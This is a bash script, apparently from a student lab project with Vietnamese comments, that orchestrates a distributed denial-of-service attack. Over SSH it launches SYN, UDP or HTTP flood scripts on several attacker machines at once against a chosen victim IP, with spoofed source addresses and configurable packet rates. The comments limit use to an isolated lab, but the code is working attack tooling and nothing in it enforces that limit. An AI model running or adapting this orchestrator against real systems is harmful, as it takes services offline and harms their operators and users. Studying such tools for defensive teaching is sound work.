#!/usr/bin/env bash
# Orchestrator DDoS QUA SSH cho nhieu MAY THAT (chay song song voi run_ddos.sh cua lab Docker,
# KHONG thay the). Dung khi victim + attacker la cac laptop that noi chung 1 WiFi.
# Chi dung trong lab co lap, chi nham victim cua minh. Xem docs/MULTI_MACHINE.md.
#
# Cach dung:
#   ./run_ddos_remote.sh <syn|http|udp> -t <ip_victim> -d <giay> -a <user@ip_attacker1> [-a <user@ip_attacker2> ...]
#
# Vi du:
#   # 1 attacker:
#   ./run_ddos_remote.sh syn  -t 192.168.1.50 -d 30 -a kali@192.168.1.61
#   # 2 attacker (DDoS L7 that, n_src>=2):
#   ./run_ddos_remote.sh http -t 192.168.1.50 -d 30 -a user@192.168.1.61 -a user@192.168.1.62
#   # UDP flood (volumetric L3/4), can raw socket giong SYN:
#   ./run_ddos_remote.sh udp  -t 192.168.1.50 -d 30 -a user@192.168.1.61
#
# Cac co:
#   -t  IP victim (bat buoc)
#   -d  thoi luong (giay, mac dinh 30)
#   -a  attacker user@ip (LAP LAI de them may; can it nhat 1)
#   -r  pps/nguon cho SYN va UDP (mac dinh 400; khong tac dung voi http)
#   -s  them 'sudo' truoc lenh SYN/UDP (dung khi may attacker cau hinh NOPASSWD sudoers thay vi CAP_NET_RAW)
#
# YEU CAU: da tao SSH key toi tung attacker (ssh-keygen + ssh-copy-id) de khong bi hoi mat khau.
# SYN flood VA UDP flood can quyen raw socket: khuyen dung CAP_NET_RAW tren may attacker (khi do KHONG
# can -s); neu dung NOPASSWD sudoers thi them -s. HTTP flood khong can quyen gi. Chi tiet: docs/MULTI_MACHINE.md.
set -euo pipefail

MODE="syn"
TARGET=""
DURATION=30
PPS=400
USE_SUDO=0
ATTACKERS=()
# Duong dan repo tren may attacker. Doi bang bien moi truong REMOTE_REPO neu clone cho khac.
# Dung dau ngang (~) de may attacker tu dan toi $HOME cua user SSH (KHONG dan o may dieu khien).
REPO="${REMOTE_REPO:-}"
if [[ -z "$REPO" ]]; then REPO='~/dos-ddos-project'; fi

usage() { sed -n '6,26p' "$0"; }

# tham so dau tien (neu co) la mode syn|http|udp, giong run_ddos.sh
if [[ "${1:-}" == "syn" || "${1:-}" == "http" || "${1:-}" == "udp" ]]; then MODE="$1"; shift; fi
while [[ $# -gt 0 ]]; do
  case "$1" in
    -t|--target)   TARGET="$2"; shift 2 ;;
    -d|--duration) DURATION="$2"; shift 2 ;;
    -a|--attacker) ATTACKERS+=("$2"); shift 2 ;;
    -r|--pps)      PPS="$2"; shift 2 ;;
    -s|--sudo)     USE_SUDO=1; shift ;;
    syn|http|udp)  MODE="$1"; shift ;;
    -h|--help)     usage; exit 0 ;;
    *) echo "[!] Tham so la: $1" >&2; exit 2 ;;
  esac
done

if [[ -z "$TARGET" ]]; then echo "[!] Thieu -t <ip_victim>." >&2; usage; exit 2; fi
if [[ "${#ATTACKERS[@]}" -eq 0 ]]; then echo "[!] Thieu -a <user@ip> (it nhat 1 may attacker)." >&2; usage; exit 2; fi

# --- preflight: kiem tra SSH toi tung attacker (bat loi thieu key som, truoc khi ban) ---
echo "[*] Kiem tra SSH toi ${#ATTACKERS[@]} may attacker..."
for att in "${ATTACKERS[@]}"; do
  if ! ssh -o BatchMode=yes -o ConnectTimeout=5 "$att" true 2>/dev/null; then
    echo "[!] Khong SSH duoc toi '$att' (chua co SSH key? sai user@ip? may chua bat?)." >&2
    echo "    Tao key mot lan:  ssh-keygen -t ed25519   roi:  ssh-copy-id $att" >&2
    exit 3
  fi
done

echo "[*] DDoS mode=$MODE tu ${#ATTACKERS[@]} may -> $TARGET trong ${DURATION}s (repo tren attacker: $REPO)"

pids=()
for att in "${ATTACKERS[@]}"; do
  # SYN va UDP deu can raw socket (root) -> dung chung nhanh xu ly quyen (prefix sudo neu -s).
  # HTTP khong can quyen nen KHONG gom chung.
  prefix=""
  if [[ "$MODE" == "syn" || "$MODE" == "udp" ]] && [[ "$USE_SUDO" == "1" ]]; then prefix="sudo "; fi
  if [[ "$MODE" == "syn" ]]; then
    # SYN flood (L4): spoof IP, pacing --pps. 'sudo timeout python3' de SIGTERM giet dung python con.
    rcmd="${prefix}timeout $DURATION python3 $REPO/attacks/syn_flood.py $TARGET -p 80 --spoof --pps $PPS"
  elif [[ "$MODE" == "udp" ]]; then
    # UDP flood (volumetric L3/4): raw socket giong SYN; spoof IP, pacing --pps.
    rcmd="${prefix}timeout $DURATION python3 $REPO/attacks/udp_flood.py $TARGET -p 80 --spoof --pps $PPS"
  else
    # HTTP flood (L7): urllib, khong can quyen root.
    rcmd="timeout $DURATION python3 $REPO/attacks/http_flood.py $TARGET -p 80 -t 20 -d $DURATION"
  fi
  echo "    -> $att : $rcmd"
  ssh "$att" "$rcmd" &          # chay nen de tat ca ban DONG THOI
  pids+=($!)
done

echo "[*] Dang tan cong song song... (doi ${DURATION}s, timeout tu dung)"
wait "${pids[@]}" || true        # cho tat ca SSH ket thuc (timeout tren may attacker tu dung)
echo "[*] Xong. Neu con sot tien trinh: ssh <attacker> 'pkill -f flood.py'."
